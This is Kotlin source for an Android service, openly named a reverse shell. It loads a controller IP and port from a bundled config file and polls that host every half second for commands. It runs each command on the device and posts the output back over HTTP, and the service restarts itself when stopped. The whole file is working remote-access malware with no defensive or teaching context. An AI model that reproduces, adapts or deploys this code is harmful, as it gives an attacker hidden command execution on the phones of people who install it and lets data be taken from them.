package com.shahidshaik.reverseshell

import android.app.Service
import android.content.Intent
import android.os.Handler
import android.os.IBinder
import android.util.Log
import java.io.*
import java.net.HttpURLConnection
import java.net.URL

class ReverseShellService : Service() {

    private lateinit var handler: Handler
    private lateinit var commandRunnable: Runnable
    private lateinit var serverIp: String
    private var serverPort: Int = 0
    private var lastCommand: String? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        try {
            // Read IP and port from config.txt in assets
            val inputStream = assets.open("config.txt")
            val reader = BufferedReader(InputStreamReader(inputStream))
            val line = reader.readLine()
            val parts = line.split(":")
            serverIp = parts[0].trim()
            serverPort = parts[1].trim().toInt()
            Log.d("ReverseShell", "Loaded config: IP=$serverIp, Port=$serverPort")
        } catch (e: Exception) {
            Log.e("ReverseShell", "Error reading config.txt", e)
            stopSelf()
            return START_NOT_STICKY
        }

        handler = Handler(mainLooper)
        Log.d("ReverseShell", "Service started")
        commandRunnable = object : Runnable {
            override fun run() {
                Thread {
                    try {
                        Log.d(
                            "ReverseShell",
                            "Connecting to server at http://$serverIp:$serverPort"
                        )
                        val getUrl = URL("http://$serverIp:$serverPort")
                        val getConn = getUrl.openConnection() as HttpURLConnection
                        getConn.requestMethod = "GET"

                        val command =
                            BufferedReader(InputStreamReader(getConn.inputStream)).readLine()
                        Log.d("ReverseShell", "Received command: $command")

                        if (!command.isNullOrEmpty() && command != lastCommand) {
                            lastCommand = command
                            val output = executeCommand(command)

                            Log.d("ReverseShell", "Sending response back")

                            val postUrl = URL("http://$serverIp:$serverPort")
                            val postConn = postUrl.openConnection() as HttpURLConnection
                            postConn.requestMethod = "POST"
                            postConn.doOutput = true
                            val os = postConn.outputStream
                            os.write(output.toByteArray())
                            os.flush()
                            os.close()
                            postConn.inputStream.close()
                        }

                    } catch (e: Exception) {
                        Log.e("ReverseShell", "Error: ${e.message}", e)
                    }
                }.start()

                handler.postDelayed(this, 500)
            }
        }

        handler.post(commandRunnable)
        return START_STICKY
    }

    private fun executeCommand(command: String): String {
        return try {
            val process = Runtime.getRuntime().exec(command)
            val output = process.inputStream.bufferedReader().readText()
            val error = process.errorStream.bufferedReader().readText()
            (output + error).ifBlank { "No output" }
        } catch (e: Exception) {
            "Error executing command: ${e.message}"
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
